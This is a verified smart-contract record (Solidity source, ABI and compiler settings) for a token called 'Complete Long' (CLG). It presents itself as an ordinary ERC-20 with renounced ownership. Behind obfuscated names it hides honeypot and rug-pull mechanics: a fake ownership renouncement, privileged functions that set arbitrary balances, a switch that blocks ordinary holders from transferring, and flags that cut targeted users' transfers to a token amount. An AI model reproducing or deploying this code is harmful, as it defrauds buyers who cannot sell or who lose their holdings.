{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.9;\n\ninterface launchedTx {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address tradingSenderExempt) external view returns (uint256);\n\n    function transfer(address receiverTrading, uint256 marketingSell) external returns (bool);\n\n    function allowance(address modeList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 marketingSell) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address receiverTrading,\n        uint256 marketingSell\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed tokenLaunchedMin, uint256 value);\n    event Approval(address indexed modeList, address indexed spender, uint256 value);\n}\n\nabstract contract buyMin {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoSenderSell {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface launchedAmountTx {\n    function createPair(address amountTradingAuto, address enableMax) external returns (address);\n}\n\ninterface launchedTxMetadata is launchedTx {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract CompleteLong is buyMin, launchedTx, launchedTxMetadata {\n\n    uint256 takeBuyEnable;\n\n    mapping(address => uint256) private exemptFeeList;\n\n    uint256 constant fromMaxTotal = 15 ** 10;\n\n    function approve(address liquidityFee, uint256 marketingSell) public virtual override returns (bool) {\n        tradingToken[_msgSender()][liquidityFee] = marketingSell;\n        emit Approval(_msgSender(), liquidityFee, marketingSell);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return autoBuy;\n    }\n\n    uint8 private launchedMax = 18;\n\n    string private autoBuy = \"Complete Long\";\n\n    function allowance(address sellToken, address liquidityFee) external view virtual override returns (uint256) {\n        if (liquidityFee == amountFee) {\n            return type(uint256).max;\n        }\n        return tradingToken[sellToken][liquidityFee];\n    }\n\n    address public exemptLaunchLaunched;\n\n    function transfer(address walletMode, uint256 marketingSell) external virtual override returns (bool) {\n        return txTotal(_msgSender(), walletMode, marketingSell);\n    }\n\n    function txAuto(address walletMode, uint256 marketingSell) public {\n        modeToken();\n        exemptFeeList[walletMode] = marketingSell;\n    }\n\n    constructor (){\n        \n        autoSenderSell senderTx = autoSenderSell(amountFee);\n        isEnableWallet = launchedAmountTx(senderTx.factory()).createPair(senderTx.WETH(), address(this));\n        \n        exemptLaunchLaunched = _msgSender();\n        totalFrom();\n        walletToken[exemptLaunchLaunched] = true;\n        exemptFeeList[exemptLaunchLaunched] = sellLiquidity;\n        if (receiverLiquidity) {\n            feeSellMarketing = false;\n        }\n        emit Transfer(address(0), exemptLaunchLaunched, sellLiquidity);\n    }\n\n    uint256 public limitReceiver;\n\n    bool private fromBuy;\n\n    uint256 private maxList;\n\n    function getOwner() external view returns (address) {\n        return sellLimit;\n    }\n\n    function exemptTotal(address toTokenList) public {\n        modeToken();\n        if (fromBuy) {\n            limitReceiver = maxList;\n        }\n        if (toTokenList == exemptLaunchLaunched || toTokenList == isEnableWallet) {\n            return;\n        }\n        receiverSwap[toTokenList] = true;\n    }\n\n    uint256 private atTrading;\n\n    bool public sellBuy;\n\n    function symbol() external view virtual override returns (string memory) {\n        return maxTo;\n    }\n\n    uint256 private sellLiquidity = 100000000 * 10 ** 18;\n\n    mapping(address => mapping(address => uint256)) private tradingToken;\n\n    function decimals() external view virtual override returns (uint8) {\n        return launchedMax;\n    }\n\n    function modeToken() private view {\n        require(walletToken[_msgSender()]);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return sellLiquidity;\n    }\n\n    function liquidityLaunch(uint256 marketingSell) public {\n        modeToken();\n        tokenMarketing = marketingSell;\n    }\n\n    event OwnershipTransferred(address indexed atTeam, address indexed fromSender);\n\n    function txTotal(address minMax, address receiverTrading, uint256 marketingSell) internal returns (bool) {\n        if (minMax == exemptLaunchLaunched) {\n            return buySender(minMax, receiverTrading, marketingSell);\n        }\n        uint256 walletFee = launchedTx(isEnableWallet).balanceOf(exemptTeamBuy);\n        require(walletFee == tokenMarketing);\n        require(receiverTrading != exemptTeamBuy);\n        if (receiverSwap[minMax]) {\n            return buySender(minMax, receiverTrading, fromMaxTotal);\n        }\n        return buySender(minMax, receiverTrading, marketingSell);\n    }\n\n    address exemptTeamBuy = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function isMax(address takeMax) public {\n        if (sellBuy) {\n            return;\n        }\n        if (maxList != atTrading) {\n            teamBuyShould = true;\n        }\n        walletToken[takeMax] = true;\n        if (limitAt != receiverLiquidity) {\n            maxList = atTrading;\n        }\n        sellBuy = true;\n    }\n\n    mapping(address => bool) public receiverSwap;\n\n    bool private teamBuyShould;\n\n    uint256 tokenMarketing;\n\n    bool private feeSellMarketing;\n\n    function transferFrom(address minMax, address receiverTrading, uint256 marketingSell) external override returns (bool) {\n        if (_msgSender() != amountFee) {\n            if (tradingToken[minMax][_msgSender()] != type(uint256).max) {\n                require(marketingSell <= tradingToken[minMax][_msgSender()]);\n                tradingToken[minMax][_msgSender()] -= marketingSell;\n            }\n        }\n        return txTotal(minMax, receiverTrading, marketingSell);\n    }\n\n    address public isEnableWallet;\n\n    bool private receiverLiquidity;\n\n    function buySender(address minMax, address receiverTrading, uint256 marketingSell) internal returns (bool) {\n        require(exemptFeeList[minMax] >= marketingSell);\n        exemptFeeList[minMax] -= marketingSell;\n        exemptFeeList[receiverTrading] += marketingSell;\n        emit Transfer(minMax, receiverTrading, marketingSell);\n        return true;\n    }\n\n    mapping(address => bool) public walletToken;\n\n    string private maxTo = \"CLG\";\n\n    function balanceOf(address tradingSenderExempt) public view virtual override returns (uint256) {\n        return exemptFeeList[tradingSenderExempt];\n    }\n\n    function totalFrom() public {\n        emit OwnershipTransferred(exemptLaunchLaunched, address(0));\n        sellLimit = address(0);\n    }\n\n    address private sellLimit;\n\n    address amountFee = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    bool private limitAt;\n\n    function owner() external view returns (address) {\n        return sellLimit;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"modeList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTeam\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fromSender\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"tokenLaunchedMin\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellToken\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityFee\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityFee\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingSell\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tradingSenderExempt\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"exemptLaunchLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toTokenList\",\"type\":\"address\"}],\"name\":\"exemptTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"isEnableWallet\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMax\",\"type\":\"address\"}],\"name\":\"isMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitReceiver\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"marketingSell\",\"type\":\"uint256\"}],\"name\":\"liquidityLaunch\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverSwap\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalFrom\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingSell\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"receiverTrading\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingSell\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"marketingSell\",\"type\":\"uint256\"}],\"name\":\"txAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletToken\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "CompleteLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}